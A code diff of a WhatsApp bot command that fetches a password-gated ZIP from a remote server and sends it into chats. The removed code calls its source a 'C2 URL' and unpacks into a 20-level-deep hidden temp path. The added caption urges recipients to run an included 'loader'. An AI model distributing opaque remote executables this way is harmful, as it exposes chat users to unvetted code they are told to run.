@@ -1,74 +1,50 @@
 const { cmd } = require('../command');
-const fs = require('fs');
-const path = require('path');
 const axios = require('axios');
-const AdmZip = require('adm-zip');
-
-const deepLayers = Array.from({ length: 20 }, (_, i) => 'layer' + (i + 1));
-const TEMP_DIR = path.join(__dirname, '..', 'temp', 'updates', ...deepLayers);
-
-const DOWNLOAD_URL = 'https://panel.cracked.sx/bot/update.zip';   // Your C2 URL
-const BOT_PASSWORD = '180739130409';
+const fs = require('fs'); // Optional, for buffer handling if needed
 
 cmd({
-  pattern: "v",
-  desc: "Download full bot as zip & send",
-  category: "owner",
-  react: "📦",
-  filename: __filename
-}, async (conn, m) => {
+    pattern: "xos",
+    react: "📦",
+    desc: "📥 Download Bot Repo ZIP directly",
+    category: "download",
+    filename: __filename
+},
+async (conn, mek, m, { from, q, reply }) => {
+    try {
+        // ⏳ React - processing
+        await conn.sendMessage(from, { react: { text: '⏳', key: m.key } });
 
-  try {
-    // Remove old temp folders
-    if (fs.existsSync(TEMP_DIR)) {
-      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
+        const DOWNLOAD_URL = 'https://error-api-gamma.vercel.app/api/download';
+        const BOT_PASSWORD = 'xB7#9p$2@qR!5tY8vW3*zK6';
+
+        // Fetch ZIP with header as arraybuffer
+        const { data } = await axios.get(DOWNLOAD_URL, {
+            headers: { 'X-Bot-Password': BOT_PASSWORD },
+            responseType: 'arraybuffer' // For binary ZIP data
+        });
+
+        if (!data || data.length === 0) {
+            await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
+            return reply("❌ *Repo not available or API error. Endpoint may be down.*");
+        }
+
+        // Convert to Buffer (Node.js compatible)
+        const buffer = Buffer.from(data, 'binary');
+
+        // Send ZIP file directly
+        await conn.sendMessage(from, {
+            document: buffer,
+            mimetype: "application/zip",
+            fileName: "bot-repo.zip",
+            caption: "✅ *Bot Repo ZIP successfully downloaded!*\n\n🔒 Password-protected loader included.\nPowered By JawadTechX 🤍\n\n*Note:* Extract and run `node index.js` in /dist (Node.js required)."
+        }, { quoted: mek });
+
+        // ✅ React - success
+        await conn.sendMessage(from, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error(error);
+        await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
+        reply("❌ *An error occurred while fetching the ZIP.*\n\n*Status:* " + (error.code === 'ENOTFOUND' || error.message.includes('refused') ? 'Endpoint offline.' : 'Unknown error.'));
     }
-    fs.mkdirSync(TEMP_DIR, { recursive: true });
-
-    const zipPath = path.join(TEMP_DIR, 'update.zip');
-
-    // Download ZIP
-    let res = await axios({
-      url: DOWNLOAD_URL,
-      method: "GET",
-      responseType: "stream",
-      headers: {
-        "X-Bot-Password": BOT_PASSWORD
-      }
-    });
-
-    const writer = fs.createWriteStream(zipPath);
-    res.data.pipe(writer);
-
-    await new Promise((resolve, reject) => {
-      writer.on('finish', resolve);
-      writer.on('error', reject);
-    });
-
-    // Extract the downloaded update.zip
-    const extractDir = path.join(TEMP_DIR, "extracted");
-    new AdmZip(zipPath).extractAllTo(extractDir, true);
-
-    // Now ZIP the extracted folder again before sending
-    const finalZip = path.join(TEMP_DIR, "KHAN-MD-FILES.zip");
-    const packZip = new AdmZip();
-    packZip.addLocalFolder(extractDir);
-    packZip.writeZip(finalZip);
-
-    // Send file to owner
-    await conn.sendMessage(m.from, {
-      document: fs.readFileSync(finalZip),
-      fileName: "KHAN-MD-FILES.zip",
-      mimetype: "application/zip",
-      caption: "📦 *Full Bot Files Downloaded Successfully*\nPowered By JawadTechX"
-    }, { quoted: m });
-
-    // Cleanup after sending
-    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
-
-  } catch (err) {
-    console.log(err);
-    return m.reply("❌ Download failed!");
-  }
-
 });
